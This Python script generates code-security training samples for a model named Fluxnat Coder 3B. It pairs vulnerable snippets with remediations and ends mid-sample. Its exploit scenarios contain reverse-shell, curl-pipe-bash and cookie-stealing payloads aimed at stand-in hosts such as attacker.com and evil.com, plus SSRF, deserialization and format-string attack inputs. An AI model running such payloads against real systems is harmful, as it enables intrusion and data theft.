#!/usr/bin/env python3
"""Generate 200+ red team / offensive security training samples for Fluxnat Coder 3B."""
import json, os

SAMPLES = []

def V(lang, code, cwe, name, sev, chain, exploit, fix):
    """Vulnerability analysis sample."""
    ext = {"Python":"python","Java":"java","PHP":"php","JavaScript":"javascript",
           "Go":"go","C":"c","C++":"cpp","Ruby":"ruby","C#":"csharp","Node.js":"javascript",
           "TypeScript":"typescript","Kotlin":"kotlin","Rust":"rust","Shell":"bash"}.get(lang, lang.lower())
    steps = "\n".join(f"{i+1}. {s}" for i,s in enumerate(chain))
    SAMPLES.append({
        "instruction": f"Analyze this {lang} code for security vulnerabilities:\n```{ext}\n{code}\n```",
        "input": "",
        "output": f"## Security Analysis\n\n**Vulnerability Detected:** {name}\n**CWE Classification:** CWE-{cwe}\n**Severity:** {sev}\n**Language:** {lang}\n\n**Reasoning Chain:**\n{steps}\n\n**Exploit Scenario:**\n{exploit}\n\n**Remediation:**\n```{ext}\n{fix}\n```"
    })

def E(title, scenario, kill_chain, tools, impact):
    """Exploit chain sample."""
    steps = "\n".join(f"{i+1}. {s}" for i,s in enumerate(kill_chain))
    SAMPLES.append({
        "instruction": f"{scenario}",
        "input": "",
        "output": f"## Exploit Chain Analysis\n\n**Attack Vector:** {title}\n\n**Kill Chain:**\n{steps}\n\n**Tools & Payloads:**\n{tools}\n\n**Impact:** {impact}"
    })

def P(request, ptype, payload, explanation, usage):
    """Payload generation sample."""
    SAMPLES.append({
        "instruction": request,
        "input": "",
        "output": f"## Payload Generation\n\n**Payload Type:** {ptype}\n\n**Generated Payload:**\n```\n{payload}\n```\n\n**Explanation:**\n{explanation}\n\n**Usage Context:**\n{usage}"
    })

def A(technique, mitre, desc, steps, tools, detection):
    """Attack technique sample."""
    numbered = "\n".join(f"{i+1}. {s}" for i,s in enumerate(steps))
    SAMPLES.append({
        "instruction": f"Explain how to perform {technique}.",
        "input": "",
        "output": f"## Attack Technique\n\n**Technique:** {technique}\n**MITRE ATT&CK:** {mitre}\n\n**Description:**\n{desc}\n\n**Steps:**\n{numbered}\n\n**Tools:**\n{tools}\n\n**Detection:**\n{detection}"
    })

def B(lang, code, explanation):
    """Benign (secure) control sample."""
    ext = {"Python":"python","Java":"java","PHP":"php","JavaScript":"javascript",
           "Go":"go","C":"c","Ruby":"ruby","Node.js":"javascript","Rust":"rust","C#":"csharp"}.get(lang, lang.lower())
    SAMPLES.append({
        "instruction": f"Analyze this {lang} code for security vulnerabilities:\n```{ext}\n{code}\n```",
        "input": "",
        "output": f"## Security Analysis\n\n**No Vulnerability Detected**\n**Language:** {lang}\n\n**Security Controls Present:**\n{explanation}"
    })

# ═══════════════════════════════════════════════════════════════
# SECTION 1: CWE-DIVERSE VULNERABILITY ANALYSIS (100 samples)
# ═══════════════════════════════════════════════════════════════

# --- CWE-89: SQL Injection (5) ---
V("Python",
  'def login(username, password):\n    conn = psycopg2.connect(DSN)\n    cur = conn.cursor()\n    cur.execute(f"SELECT * FROM users WHERE name=\'{username}\' AND pass=\'{password}\'")\n    return cur.fetchone()',
  89, "SQL Injection", "Critical (9/10)",
  ["User-supplied `username` and `password` are interpolated directly into SQL via f-string",
   "No parameterized query or input sanitization is used",
   "Attacker injects `' OR '1'='1' --` to bypass authentication",
   "Full database read/write possible through UNION or stacked queries"],
  "Input `username = \"' OR '1'='1' --\"` bypasses auth. `' UNION SELECT username,password,null FROM users--` dumps credentials.",
  'cur.execute("SELECT * FROM users WHERE name=%s AND pass=%s", (username, password))')

V("PHP",
  '<?php\n$id = $_GET["id"];\n$result = mysqli_query($conn, "SELECT * FROM products WHERE id = $id");\n$row = mysqli_fetch_assoc($result);\necho $row["name"];\n?>',
  89, "SQL Injection", "Critical (9/10)",
  ["GET parameter `id` is embedded directly into SQL query without sanitization",
   "No type casting, prepared statement, or escaping is applied",
   "Attacker manipulates `id` parameter to inject arbitrary SQL",
   "Entire database schema and data can be extracted via UNION injection"],
  "GET `?id=1 UNION SELECT username,password,3,4 FROM users--` extracts credentials. `?id=1; DROP TABLE products--` destroys data.",
  '$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");\n$stmt->bind_param("i", $_GET["id"]);\n$stmt->execute();')

V("Java",
  'public User findUser(String email) {\n    String sql = "SELECT * FROM users WHERE email = \'" + email + "\'";\n    Statement stmt = connection.createStatement();\n    ResultSet rs = stmt.executeQuery(sql);\n    return mapUser(rs);\n}',
  89, "SQL Injection", "Critical (9/10)",
  ["String concatenation builds SQL query with unsanitized `email` parameter",
   "Uses `Statement` instead of `PreparedStatement`",
   "Attacker supplies `' OR 1=1--` to return all users",
   "Can escalate to data exfiltration or DB admin operations via stacked queries"],
  "Input `email = \"' UNION SELECT table_name,null,null FROM information_schema.tables--\"` enumerates tables.",
  'PreparedStatement ps = connection.prepareStatement("SELECT * FROM users WHERE email = ?");\nps.setString(1, email);\nResultSet rs = ps.executeQuery();')

V("Ruby",
  'def search(query)\n  results = ActiveRecord::Base.connection.execute(\n    "SELECT * FROM articles WHERE title LIKE \'%#{query}%\'"\n  )\n  results.to_a\nend',
  89, "SQL Injection", "Critical (9/10)",
  ["User input `query` is interpolated into raw SQL via Ruby string interpolation",
   "Bypasses ActiveRecord's built-in query parameterization",
   "Attacker injects `%'; DROP TABLE articles;--` to destroy data",
   "Raw `execute` provides no protection against SQL injection"],
  "Input `query = \"%' UNION SELECT username,password FROM users--\"` dumps credentials.",
  'def search(query)\n  Article.where("title LIKE ?", "%#{query}%")\nend')

V("Node.js",
  'app.get("/user", (req, res) => {\n  const name = req.query.name;\n  db.query(`SELECT * FROM users WHERE name = \'${name}\'`, (err, rows) => {\n    res.json(rows);\n  });\n});',
  89, "SQL Injection", "Critical (9/10)",
  ["Template literal embeds `req.query.name` directly into SQL",
   "No parameterization or escaping of user input",
   "Attacker crafts name parameter to extract or modify database",
   "Could lead to full data breach or remote code execution via `INTO OUTFILE`"],
  "GET `/user?name=' UNION SELECT * FROM information_schema.tables--` enumerates DB.",
  'db.query("SELECT * FROM users WHERE name = ?", [req.query.name], (err, rows) => {\n  res.json(rows);\n});')

# --- CWE-78: OS Command Injection (4) ---
V("Python",
  'import subprocess\ndef ping_host(host):\n    result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True)\n    return result.stdout.decode()',
  78, "OS Command Injection", "Critical (10/10)",
  ["User input `host` is interpolated into shell command via f-string",
   "`shell=True` enables shell metacharacter interpretation",
   "Attacker injects `; cat /etc/passwd` or `&& rm -rf /` after the host",
   "Full system compromise possible — arbitrary command execution as web server user"],
  "Input `host = \"127.0.0.1; cat /etc/shadow\"` reads password hashes. `host = \"127.0.0.1 && curl attacker.com/shell.sh | bash\"` downloads and executes reverse shell.",
  'import shlex\nresult = subprocess.run(["ping", "-c", "4", host], capture_output=True)')

V("PHP",
  '<?php\n$filename = $_POST["filename"];\n$output = shell_exec("file " . $filename);\necho "<pre>$output</pre>";\n?>',
  78, "OS Command Injection", "Critical (10/10)",
  ["POST parameter `filename` is concatenated directly into `shell_exec` command",
   "No input validation, escaping, or allowlisting",
   "Attacker injects shell metacharacters (`;`, `|`, `&&`, backticks)",
   "Server-side arbitrary command execution as web server user"],
  "POST `filename=test.txt; whoami` returns server username. `filename=x; nc -e /bin/bash attacker.com 4444` opens reverse shell.",
  '$filename = escapeshellarg($_POST["filename"]);\n$output = shell_exec("file " . $filename);')

V("Ruby",
  'def convert_image(input_file, format)\n  system("convert #{input_file} output.#{format}")\nend',
  78, "OS Command Injection", "Critical (10/10)",
  ["Ruby string interpolation passes unsanitized `input_file` and `format` to `system()`",
   "`system()` with a single string argument invokes a shell",
   "Attacker controls filename to inject arbitrary commands",
   "Complete server compromise possible"],
  "Input `input_file = \"img.png; curl attacker.com/shell | bash\"` executes reverse shell.",
  'system("convert", input_file, "output.#{format}")')

V("Go",
  'func runDiag(w http.ResponseWriter, r *http.Request) {\n    target := r.URL.Query().Get("target")\n    out, _ := exec.Command("sh", "-c", "traceroute " + target).Output()\n    w.Write(out)\n}',
  78, "OS Command Injection", "Critical (10/10)",
  ["HTTP query parameter `target` is concatenated into shell command",
   "`sh -c` interprets shell metacharacters in the combined string",
   "Attacker appends `; id` or `| nc attacker 4444 -e /bin/sh`",
   "Full RCE on the server with web application privileges"],
  "GET `?target=8.8.8.8;cat /etc/passwd` dumps system users.",
  'out, _ := exec.Command("traceroute", target).Output()')

# --- CWE-79: XSS (6) ---
V("PHP",
  '<?php\n$search = $_GET["q"];\necho "<h2>Results for: $search</h2>";\n?>',
  79, "Reflected Cross-Site Scripting (XSS)", "High (7/10)",
  ["GET parameter `q` is echoed directly into HTML response without encoding",
   "No `htmlspecialchars()` or output encoding applied",
   "Attacker crafts URL with JavaScript payload in `q` parameter",
   "Victim's browser executes attacker's script in the context of the vulnerable domain"],
  'URL: `?q=<script>document.location="http://evil.com/?c="+document.cookie</script>` steals session cookies.',
  'echo "<h2>Results for: " . htmlspecialchars($search, ENT_QUOTES, "UTF-8") . "</h2>";')

V("PHP",
  '<?php\n$comment = $_POST["comment"];\n$stmt = $pdo->prepare("INSERT INTO comments (body) VALUES (?)");\n$stmt->execute([$comment]);\n// Later, rendering:\n$comments = $pdo->query("SELECT body FROM comments")->fetchAll();\nforeach ($comments as $c) {\n    echo "<div class=\'comment\'>" . $c["body"] . "</div>";\n}\n?>',
  79, "Stored Cross-Site Scripting (XSS)", "High (8/10)",
  ["Comment is safely stored via prepared statement (SQL injection prevented)",
   "However, output rendering echoes `body` without HTML encoding",
   "Stored XSS: malicious script persists in database and executes for every viewer",
   "All users viewing the comments page are affected"],
  'Submit comment: `<img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">` — executes for every visitor.',
  'echo "<div class=\'comment\'>" . htmlspecialchars($c["body"], ENT_QUOTES, "UTF-8") . "</div>";')

V("JavaScript",
  'function renderProfile(user) {\n  document.getElementById("bio").innerHTML = user.bio;\n  document.getElementById("name").innerHTML = user.displayName;\n}',
  79, "DOM-based Cross-Site Scripting (XSS)", "High (7/10)",
  ["`innerHTML` directly assigns user-controlled data (`user.bio`, `user.displayName`) to DOM",
   "No sanitization library (DOMPurify) or safe assignment method (textContent) used",
   "Attacker sets bio to `<img src=x onerror=alert(document.cookie)>` in their profile",
   "Any user viewing the attacker's profile executes the script"],
  'Set bio to `<svg/onload=fetch("http://evil.com/?c="+document.cookie)>` — triggers on profile view.',
  'document.getElementById("bio").textContent = user.bio;\n// Or use DOMPurify: document.getElementById("bio").innerHTML = DOMPurify.sanitize(user.bio);')

V("JavaScript",
  'const React = require("react");\nfunction Comment({ body }) {\n  return <div dangerouslySetInnerHTML={{ __html: body }} />;\n}',
  79, "Stored XSS via React dangerouslySetInnerHTML", "High (8/10)",
  ["React's `dangerouslySetInnerHTML` bypasses built-in XSS protection",
   "User-supplied `body` prop is rendered as raw HTML",
   "If `body` comes from database/API without sanitization, stored XSS is possible",
   "Attacker injects `<img src=x onerror=...>` into comment body"],
  'Store body as `<img src=x onerror="new Image().src=\'http://evil.com/?\'+document.cookie">` to steal cookies.',
  'import DOMPurify from "dompurify";\nfunction Comment({ body }) {\n  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(body) }} />;\n}')

V("JavaScript",
  'app.get("/search", (req, res) => {\n  const q = req.query.q;\n  res.send(`<html><body><h1>Search: ${q}</h1></body></html>`);\n});',
  79, "Reflected XSS in Express.js", "High (7/10)",
  ["Query parameter `q` is embedded directly in HTML response via template literal",
   "No output encoding or Content-Type enforcement",
   "Attacker sends crafted link to victim with XSS payload in `q`",
   "Victim's browser executes JavaScript in the application's origin"],
  'GET `/search?q=<script>fetch("http://evil.com/?"+document.cookie)</script>` steals session.',
  'const escapeHtml = (s) => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");\nres.send(`<html><body><h1>Search: ${escapeHtml(q)}</h1></body></html>`);')

V("TypeScript",
  'export class ProfileComponent {\n  @Input() userBio: string;\n  // template: <div [innerHTML]="userBio"></div>\n}',
  79, "XSS via Angular innerHTML binding", "High (7/10)",
  ["Angular `[innerHTML]` binding renders user-controlled `userBio` as HTML",
   "While Angular sanitizes some HTML, it can be bypassed with crafted payloads",
   "Attacker-controlled bio field can inject event handlers",
   "Bypassing Angular DomSanitizer leads to script execution"],
  'Set userBio to inject event-based XSS vectors that bypass Angular sanitizer.',
  '// Use text interpolation instead:\n// template: <div>{{ userBio }}</div>\n// Or pipe through a strict sanitizer')

# --- CWE-918: SSRF (4) ---
V("Python",
  'import requests\nfrom flask import request as req\n\n@app.route("/fetch")\ndef fetch_url():\n    url = req.args.get("url")\n    resp = requests.get(url)\n    return resp.text',
  918, "Server-Side Request Forgery (SSRF)", "Critical (9/10)",
  ["User-supplied `url` parameter is passed directly to `requests.get()`",
   "No URL validation, scheme restriction, or IP allowlisting",
   "Attacker can target internal services, cloud metadata endpoints, or localhost",
   "Access to `http://169.254.169.254/latest/meta-data/iam/` steals cloud credentials"],
  'GET `/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` steals AWS IAM credentials. `/fetch?url=http://localhost:6379/` queries internal Redis.',
  'from urllib.parse import urlparse\nALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}\ndef fetch_url():\n    url = req.args.get("url")\n    parsed = urlparse(url)\n    if parsed.hostname not in ALLOWED_HOSTS or parsed.scheme not in ("http","https"):\n        abort(403)\n    return requests.get(url, timeout=5).text')

V("Go",
  'func proxyHandler(w http.ResponseWriter, r *http.Request) {\n    targetURL := r.FormValue("target")\n    resp, err := http.Get(targetURL)\n    if err != nil {\n        http.Error(w, err.Error(), 500)\n        return\n    }\n    defer resp.Body.Close()\n    io.Copy(w, resp.Body)\n}',
  918, "Server-Side Request Forgery (SSRF)", "Critical (9/10)",
  ["User-supplied `target` parameter forwarded to `http.Get()` without validation",
   "No URL scheme, host, or IP restrictions",
   "Attacker reaches internal services (Redis, Elasticsearch, Kubernetes API)",
   "Cloud metadata endpoints expose IAM credentials and secrets"],
  'GET `?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` steals GCP service account token.',
  'parsed, _ := url.Parse(targetURL)\nif parsed.Hostname() != "allowed.api.com" {\n    http.Error(w, "forbidden", 403)\n    return\n}')

V("Node.js",
  'const axios = require("axios");\napp.get("/preview", async (req, res) => {\n  const { url } = req.query;\n  const response = await axios.get(url);\n  res.send(response.data);\n});',
  918, "Server-Side Request Forgery (SSRF)", "Critical (9/10)",
  ["Query parameter `url` passed directly to `axios.get()` without validation",
   "No blocklist for internal IPs (127.0.0.1, 10.x, 169.254.x)",
   "Attacker accesses internal microservices, databases, cloud metadata",
   "Can pivot to internal network or steal cloud credentials"],
  '`/preview?url=http://127.0.0.1:3000/admin` accesses admin panel. `?url=http://169.254.169.254/...` steals AWS creds.',
  'const { URL } = require("url");\nconst parsed = new URL(url);\nconst BLOCKED = ["127.0.0.1","localhost","169.254.169.254","metadata.google.internal"];\nif (BLOCKED.includes(parsed.hostname)) return res.status(403).send("blocked");')

V("Java",
  'protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String target = req.getParameter("url");\n    URL url = new URL(target);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    InputStream is = conn.getInputStream();\n    byte[] data = is.readAllBytes();\n    resp.getOutputStream().write(data);\n}',
  918, "Server-Side Request Forgery (SSRF)", "Critical (9/10)",
  ["Servlet reads `url` parameter and opens connection without any validation",
   "`URL.openConnection()` follows redirects, enabling redirect-based SSRF bypass",
   "Attacker targets internal services via `http://10.0.0.1:8080/internal-api`",
   "Java follows HTTP 302 redirects by default, amplifying attack surface"],
  'Parameter `url=http://169.254.169.254/latest/meta-data/` steals EC2 instance metadata.',
  'URL parsed = new URL(target);\nif (!ALLOWED_HOSTS.contains(parsed.getHost())) {\n    resp.sendError(403, "Host not allowed");\n    return;\n}')

# --- CWE-502: Deserialization (4) ---
V("Java",
  'public Object readObject(HttpServletRequest req) throws Exception {\n    ObjectInputStream ois = new ObjectInputStream(req.getInputStream());\n    Object obj = ois.readObject();\n    return obj;\n}',
  502, "Insecure Deserialization", "Critical (10/10)",
  ["HTTP request body is deserialized directly via `ObjectInputStream`",
   "No type validation, allowlisting, or `ObjectInputFilter`",
   "Attacker sends crafted serialized object (e.g., Commons Collections gadget chain)",
   "Remote Code Execution via gadget chains — server fully compromised"],
  'Send ysoserial CommonsCollections1 payload: `java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" | curl -X POST --data-binary @- http://target/api`',
  '// Use ObjectInputFilter (Java 9+)\nObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.dto.*;!*");\nois.setObjectInputFilter(filter);\n// Or use JSON serialization instead of Java serialization')

V("Python",
  'import pickle\nfrom flask import request\n\n@app.route("/load", methods=["POST"])\ndef load_data():\n    data = pickle.loads(request.data)\n    return str(data)',
  502, "Insecure Deserialization via pickle", "Critical (10/10)",
  ["HTTP POST body is deserialized via `pickle.loads()` without any validation",
   "Python pickle can execute arbitrary code during deserialization via `__reduce__`",
   "Attacker crafts pickle payload that spawns reverse shell on load",
   "No safe way to use pickle with untrusted data — it's inherently unsafe"],
  'Payload: `import pickle,os; class RCE: __reduce__=lambda s:(os.system,("curl attacker.com/shell|bash",)); pickle.dumps(RCE())` — sends crafted bytes to endpoint.',
  'import json\n@app.route("/load", methods=["POST"])\ndef load_data():\n    data = json.loads(request.data)  # Use JSON, never pickle with untrusted data\n    return str(data)')

V("PHP",
  '<?php\n$data = $_COOKIE["session_data"];\n$obj = unserialize($data);\necho $obj->username;\n?>',
  502, "Insecure Deserialization via PHP unserialize", "Critical (9/10)",
  ["Cookie value is deserialized via `unserialize()` without validation",
   "PHP magic methods (`__wakeup`, `__destruct`, `__toString`) execute during deserialization",
   "Attacker crafts serialized object with malicious magic method chains (POP chains)",
   "Can lead to RCE, file deletion, or arbitrary file writes"],
  'Cookie: `session_data=O:8:"Backdoor":1:{s:4:"cmd";s:9:"cat /etc/passwd";}` exploits `__destruct()` or `__toString()` methods.',
  '$data = json_decode(base64_decode($_COOKIE["session_data"]), true);\n// Or use allowed_classes parameter:\n$obj = unserialize($data, ["allowed_classes" => ["SafeUser"]]);')

V("Node.js",
  'const serialize = require("node-serialize");\napp.post("/session", (req, res) => {\n  const data = serialize.unserialize(req.body.data);\n  res.json({ user: data.user });\n});',
  502, "Insecure Deserialization via node-serialize", "Critical (10/10)",
  ["`node-serialize.unserialize()` can execute JavaScript functions in serialized data",
   "User-controlled `req.body.data` is deserialized without validation",
   "Attacker includes IIFE (Immediately Invoked Function Expression) in serialized payload",
   "Leads to Remote Code Execution on the Node.js server"],
  'Payload: `{"user":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'curl attacker.com/shell|bash\')}()"}` executes on deserialization.',
  '// Use JSON.parse instead — never use node-serialize with user input\nconst data = JSON.parse(req.body.data);')

# --- CWE-120/125/416/190/787/476/134: Memory Safety (17) ---
V("C",
  'void process_input(char *user_input) {\n    char buffer[64];\n    strcpy(buffer, user_input);\n    printf("Received: %s\\n", buffer);\n}',
  120, "Buffer Overflow via strcpy", "Critical (10/10)",
  ["`strcpy` copies `user_input` into 64-byte `buffer` without length check",
   "If `user_input` exceeds 64 bytes, it overwrites adjacent stack memory",
   "Attacker overwrites return address to redirect execution flow",
   "Leads to arbitrary code execution or denial of service"],
  'Input of 72+ bytes overwrites saved EBP and return address. With NX disabled: `python -c "print(\'A\'*64 + shellcode_addr)"` hijacks control flow.',
  'void process_input(char *user_input) {\n    char buffer[64];\n    strncpy(buffer, user_input, sizeof(buffer) - 1);\n    buffer[sizeof(buffer) - 1] = \'\\0\';\n    printf("Received: %s\\n", buffer);\n}')

V("C",
  'void log_entry(char *user, char *action) {\n    char log[128];\n    sprintf(log, "User: %s performed: %s at %s", user, action, get_time());\n    write_log(log);\n}',
  120, "Buffer Overflow via sprintf", "Critical (10/10)",
  ["`sprintf` writes formatted string into 128-byte buffer without bounds checking",
   "Combined length of `user`, `action`, and timestamp can exceed 128 bytes",
   "Stack buffer overflow corrupts return address and saved registers",
   "Attacker controls `user` or `action` to inject shellcode"],
  'Long `user` string (200 chars) overflows buffer, overwrites return address.',
  'snprintf(log, sizeof(log), "User: %s performed: %s at %s", user, action, get_time());')

V("C",
  'void read_name() {\n    char name[32];\n    printf("Enter name: ");\n    gets(name);\n    printf("Hello, %s\\n", name);\n}',
  120, "Buffer Overflow via gets", "Critical (10/10)",
  ["`gets()` reads unlimited input from stdin into 32-byte buffer",
   "No way to limit input length — `gets` is inherently unsafe (removed in C11)",
   "Any input over 32 bytes overflows the stack buffer",
   "Trivially exploitable for return address overwrite"],
  '`python -c "print(\'A\'*44 + \'\\xef\\xbe\\xad\\xde\')" | ./program` overwrites return address.',
  'fgets(name, sizeof(name), stdin);\nname[strcspn(name, "\\n")] = \'\\0\';  // Remove trailing newline')

V("C",
  'int read_packet(int fd) {\n    char buf[256];\n    int len = read_header(fd);  // attacker-controlled length\n    read(fd, buf, len);\n    return process(buf, len);\n}',
  125, "Out-of-Bounds Read", "High (8/10)",
  ["`len` is read from network header — attacker-controlled value",
   "If `len > 256`, `read()` writes beyond buffer (overflow) or reads beyond (OOB read)",
   "If `len` is negative (signed int), it wraps to large positive value",
   "Leaks adjacent stack memory (Heartbleed-style) or crashes process"],
  'Send header with `len=1024` to read 768 bytes of adjacent stack memory including return addresses and canaries.',
  'if (len <= 0 || len > sizeof(buf)) return -1;\nread(fd, buf, len);')

V("C",
  'void parse_records(unsigned char *data, int count) {\n    for (int i = 0; i <= count; i++) {  // off-by-one\n        process_record(data[i * RECORD_SIZE]);\n    }\n}',
  125, "Out-of-Bounds Read (Off-by-One)", "High (7/10)",
  ["Loop condition `i <= count` iterates one extra time beyond valid indices",
   "Last iteration reads `data[count * RECORD_SIZE]` which is past the allocation",
   "Attacker controls `count` to read arbitrary memory past the buffer",
   "Information leak or crash depending on memory layout"],
  'Set `count` to max valid index — loop reads one record beyond allocation, leaking heap metadata.',
  'for (int i = 0; i < count; i++) {  // Use < not <=')

V("C",
  'void process() {\n    char *buf = malloc(128);\n    read_data(buf);\n    free(buf);\n    // ... later ...\n    printf("Result: %s\\n", buf);  // use after free\n}',
  416, "Use After Free", "Critical (9/10)",
  ["`buf` is freed but the pointer is still used in `printf`",
   "Freed memory may be reallocated to another object",
   "Attacker triggers reallocation, placing controlled data in freed slot",
   "Reading freed memory leaks data; writing enables arbitrary code execution"],
  'Trigger allocation of attacker-controlled data at freed address, then `printf` reads attacker data or crashes.',
  'free(buf);\nbuf = NULL;  // Null out pointer after free\n// Move printf before free, or restructure logic')

V("C",
  'struct request *parse(int fd) {\n    struct request *req = malloc(sizeof(*req));\n    read_headers(fd, req);\n    if (req->invalid) {\n        free(req);\n    }\n    return req;  // returns freed pointer if invalid\n}',
  416, "Use After Free (Conditional)", "Critical (9/10)",
  ["When `req->invalid` is true, `req` is freed but still returned",
   "Caller uses the dangling pointer, accessing freed heap memory",
   "Attacker sends invalid request to trigger the free, then sprays heap",
   "Heap spray places attacker-controlled data at freed address — RCE possible"],
  'Send invalid request, then flood with controlled allocations of same size to occupy freed slot.',
  'if (req->invalid) {\n    free(req);\n    return NULL;  // Return NULL instead of dangling pointer\n}')

V("C",
  'void alloc_buffer(int width, int height) {\n    int size = width * height * 4;  // RGBA\n    char *buf = malloc(size);\n    if (!buf) return;\n    read_image(buf, size);\n}',
  190, "Integer Overflow", "High (8/10)",
  ["`width * height * 4` can overflow 32-bit signed int for large dimensions",
   "Example: width=65536, height=65536 → 65536*65536*4 = 2^34 overflows to 0",
   "`malloc(0)` returns a small allocation or NULL",
   "`read_image` writes full image data into tiny buffer — heap overflow"],
  'width=32768, height=32768: 32768*32768*4 = 2^32 = 0 (overflow). malloc(0) succeeds, read_image writes 4GB into ~0 bytes.',
  'size_t size = (size_t)width * height * 4;\nif (size / 4 / height != width) return;  // Overflow check\nchar *buf = malloc(size);')

V("Java",
  'public byte[] createBuffer(int count) {\n    int size = count * 1024;\n    return new byte[size];\n}',
  190, "Integer Overflow in Java", "Medium (6/10)",
  ["`count * 1024` overflows Java's 32-bit signed int for large `count` values",
   "count=2097153 gives 2097153*1024 = 2147484672 which wraps to negative",
   "Negative array size throws NegativeArraySizeException — denial of service",
   "Or wraps to small positive, creating undersized buffer"],
  'count=2097152: size wraps to 0 or negative, causing DoS or undersized allocation.',
  'long size = (long) count * 1024;\nif (size > Integer.MAX_VALUE || size < 0) throw new IllegalArgumentException();\nreturn new byte[(int) size];')

V("C",
  'void copy_data(char *dst, char *src, int len) {\n    memcpy(dst, src, len);  // len from untrusted source\n}',
  787, "Out-of-Bounds Write via memcpy", "Critical (10/10)",
  ["`len` comes from untrusted source (network packet, file header)",
   "If `len` exceeds `dst` buffer size, `memcpy` writes beyond allocation",
   "Heap buffer overflow corrupts adjacent heap metadata or objects",
   "Attacker achieves code execution via heap metadata corruption"],
  'Send packet with `len=4096` when `dst` is only 256 bytes — overwrites adjacent heap objects.',
  'if (len > dst_size) len = dst_size;\nmemcpy(dst, src, len);')

V("C",
  'void fill_table(int *table, int index, int value) {\n    table[index] = value;  // no bounds check\n}',
  787, "Out-of-Bounds Write (Array)", "Critical (9/10)",
  ["`index` is not validated against array bounds",
   "Negative or oversized `index` writes to arbitrary memory relative to `table`",
   "Attacker controls `index` and `value` to write arbitrary data anywhere",
   "Primitive for arbitrary write — leads to code execution"],
  'index=-4 writes `value` 16 bytes before `table`, potentially overwriting function pointers.',
  'if (index < 0 || index >= TABLE_SIZE) return;\ntable[index] = value;')

V("C",
  'void handle(int fd) {\n    char *buf = malloc(get_length(fd));\n    if (buf == NULL) {\n        // forgot to return!\n    }\n    read(fd, buf, 1024);\n}',
  476, "NULL Pointer Dereference", "High (7/10)",
  ["`malloc` returns NULL if allocation fails, but code continues execution",
   "Missing `return` after NULL check means `read(fd, NULL, 1024)` is called",
   "Writing to NULL pointer causes segfault (denial of service)",
   "On some embedded systems, address 0 is mappable — potential code execution"],
  'Exhaust memory to make malloc return NULL, then trigger NULL deref for crash or exploitation.',
  'if (buf == NULL) {\n    return;  // Must return or handle error\n}')

V("C",
  'Config *load(int fd) {\n    Config *c = find_cached(fd);\n    printf("Loading: %s\\n", c->name);\n    return c;\n}',
  476, "NULL Pointer Dereference (Unchecked Return)", "High (7/10)",
  ["`find_cached()` may return NULL if cache miss",
   "Code dereferences `c->name` without NULL check",
   "Crash when accessing member of NULL pointer",
   "Denial of service — reliable crash on cache miss"],
  'Request uncached resource to trigger NULL dereference crash.',
  'Config *c = find_cached(fd);\nif (c == NULL) {\n    return load_from_disk(fd);\n}\nprintf("Loading: %s\\n", c->name);')

V("C",
  'void log_action(char *user_input) {\n    char logbuf[256];\n    snprintf(logbuf, sizeof(logbuf), user_input);\n    syslog(LOG_INFO, logbuf);\n}',
  134, "Format String Vulnerability", "Critical (9/10)",
  ["`user_input` is used as the format string argument to `snprintf`",
   "Attacker supplies `%x%x%x%x` to leak stack memory",
   "`%n` writes to memory at stack address — arbitrary write primitive",
   "Full RCE possible via format string exploitation"],
  'Input `"%x.%x.%x.%x"` leaks stack values. Input `"AAAA%08x.%08x.%08x.%n"` writes to memory.',
  'snprintf(logbuf, sizeof(logbuf), "%s", user_input);  // Always use %s format specifier')

V("C",
  'void handle_request(char *msg) {\n    syslog(LOG_ERR, msg);  // msg is user-controlled\n}',
  134, "Format String Vulnerability in syslog", "Critical (9/10)",
  ["`msg` passed directly as format string to `syslog()`",
   "User controls format specifiers: `%s`, `%x`, `%n`",
   "`%x` reads stack values, `%n` writes to stack-pointed addresses",
   "Arbitrary read/write via format string — leads to RCE"],
  'Input `"%p%p%p%p"` leaks pointer values from stack. Chained `%n` writes achieve arbitrary code execution.',
  'syslog(LOG_ERR, "%s", msg);')

# --- CWE-798: Hardcoded Credentials (3) ---
V("Python",
  'import boto3\n\nclient = boto3.client(\n    "s3",\n    aws_access_key_id="AKIAIOSFODNN7EXAMPLE",\n    aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n)',
  798, "Hardcoded AWS Credentials", "Critical (9/10)",
  ["AWS access key and secret key are hardcoded in source code",
   "Anyone with repo access (including public repos) obtains these credentials",
   "Automated scanners (truffleHog, git-secrets) detect these patterns",
   "Attacker uses stolen keys to access S3, EC2, IAM — full cloud compromise"],
  'Extract keys from source → `aws sts get-caller-identity` to verify → enumerate S3 buckets → exfiltrate data.',
  'import boto3\nclient = boto3.client("s3")  # Uses default credential chain: env vars, ~/.aws/credentials, IAM role')

V("JavaScript",
  'const jwt = require("jsonwebtoken");\nconst SECRET = "super_secret_jwt_key_12345";\n\nfunction generateToken(user) {\n  return jwt.sign({ id: user.id, role: user.role }, SECRET, { expiresIn: "24h" });\n}',
  798, "Hardcoded JWT Secret", "Critical (9/10)",
  ["JWT signing secret is hardcoded as string literal in source code",
   "Anyone with code access can forge valid JWT tokens",
   "Attacker signs token with `role: 'admin'` to escalate privileges",
   "Secret rotation requires code change and redeployment"],
  'Extract secret → `jwt.sign({id:1, role:"admin"}, "super_secret_jwt_key_12345")` → forge admin token.',
  'const SECRET = process.env.JWT_SECRET;\nif (!SECRET) throw new Error("JWT_SECRET not configured");')

V("Python",
  'import psycopg2\n\ndef get_connection():\n    return psycopg2.connect(\n        host="prod-db.internal",\n        database="customers",\n        user="admin",\n        password="Pr0d_P@ssw0rd!2024"\n    )',
  798, "Hardcoded Database Password", "Critical (9/10)",
  ["Production database credentials hardcoded in source code",
   "Connection string reveals internal hostname, database name, and admin credentials",
   "Any developer, CI/CD system, or repo breach exposes production DB",
   "Attacker connects directly to production database with admin privileges"],
